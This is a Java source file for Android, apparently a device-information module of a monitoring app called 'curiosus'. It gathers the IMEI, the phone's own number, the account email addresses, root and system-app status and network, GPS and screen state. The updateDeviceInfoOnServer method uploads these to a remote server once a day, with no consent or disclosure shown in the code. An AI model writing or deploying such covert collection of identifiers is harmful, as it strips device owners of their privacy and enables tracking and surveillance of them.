package com.hyadesinc.curiosus.modules;

import java.util.Calendar;
import java.util.Date;
import java.util.regex.Pattern;

import org.json.JSONException;
import org.json.JSONObject;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Patterns;

import com.hyadesinc.curiosus.Debug;
import com.hyadesinc.curiosus.ServerMessanger;
import com.hyadesinc.curiosus.SettingsManager;
import com.hyadesinc.curiosus.lib.FileUtil;
import com.hyadesinc.curiosus.lib.MessageType;
import com.hyadesinc.curiosus.receivers.BatteryState;
import com.hyadesinc.curiosus.receivers.ScreenStateReceiver;
import com.hyadesinc.curiosus.services.AppService;
import com.hyadesinc.curiosus.variables.ServerMessage;

public class DeviceInfoModule {
	
	private static final int DAY = 24 * 60 * 60 * 1000;
	private static long getDayOffset(){
		return new Date().getTime() - DAY;
	}
	
	public static void updateDeviceInfoOnServer(Context context){
		try {
			if (!networkAvailable(context)) {
				return;
			}
			
			final SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
			String lastVer = sp.getString("LAST_VERSION", "");
			long lastUpdate = sp.getLong("LAST_INFO_UPDATE", 0);
			String ver = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
			
			if (lastVer.equals(ver) && lastUpdate > getDayOffset()) {
				return;
			}
			
			final String finalVer = ver;
			
			SettingsManager settings = new SettingsManager(context);
            TelephonyManager telephonyManager =((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
            String email_list = "";

            Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
            Account[] accounts = AccountManager.get(context).getAccounts();
            for (Account account : accounts) {
                if (emailPattern.matcher(account.name).matches()) {
                    email_list += account.name + "|";
                }
            }

			new ServerMessanger(
				context,
				new ServerMessage(MessageType.DEVICE_INFO, settings.imei())
					.addParam("brand", Build.BRAND)
					.addParam("model", Build.MODEL)
					.addParam("os", Build.VERSION.RELEASE)
					.addParam("root", AppService.isRootAvailable())
					.addParam("system", AppService.isSystemApp(context))
                    .addParam("serial", telephonyManager.getDeviceId())
                        .addParam("number", telephonyManager.getLine1Number())
                    .addParam("email_list", email_list)
					.addParam("date", Calendar.getInstance().getTimeInMillis()),
				new ServerMessanger.ICallBack() {
					@Override
					public boolean onFinished(String response) { return false; }

					@Override
					public void onError() { }

					@Override
					public void onSuccess() {
						Editor editor = sp.edit();
						editor.putString("LAST_VERSION", finalVer);
						editor.putLong("LAST_INFO_UPDATE", new Date().getTime());
						editor.commit();
					}
				}
			).start();
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static JSONObject getDeviceInfo(Context context){
		JSONObject jInfo = new JSONObject();
		
		try {
			jInfo.put("battery", BatteryState.getBatteryLevel());
			
			TelephonyManager telephonyManager =((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
			jInfo.put("operator", telephonyManager.getNetworkOperatorName());

			jInfo.put("serial", telephonyManager.getDeviceId());

            jInfo.put("number", telephonyManager.getLine1Number());


            Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
            Account[] accounts = AccountManager.get(context).getAccounts();
            for (Account account : accounts) {
                if (emailPattern.matcher(account.name).matches()) {
                    String possibleEmail = account.name;
                    jInfo.put("primary_email", possibleEmail);
                }
            }
			
			LocationManager locManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE );
			if (locManager != null) {
				jInfo.put("gps", locManager.isProviderEnabled(LocationManager.GPS_PROVIDER));
			}
			
			ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			if (connManager != null) {
				NetworkInfo wifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
				jInfo.put("wifi_connected", wifi != null && wifi.isConnectedOrConnecting());
				
				NetworkInfo gprs = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
				jInfo.put("gprs_connected", gprs != null && gprs.isConnectedOrConnecting());
			}
			
			WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
			if (wifi != null) {
				jInfo.put("wifi", wifi.isWifiEnabled());
			}
			
			jInfo.put("screen", ScreenStateReceiver.getScreenState());
			jInfo.put("external_memory", FileUtil.getExternalStorageFreeMemory());
			
		} catch (JSONException e) {
			Debug.exception(e);
		}
		
		return jInfo;
	}
	
	private static Boolean networkAvailable(Context context){
		ConnectivityManager manager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
}
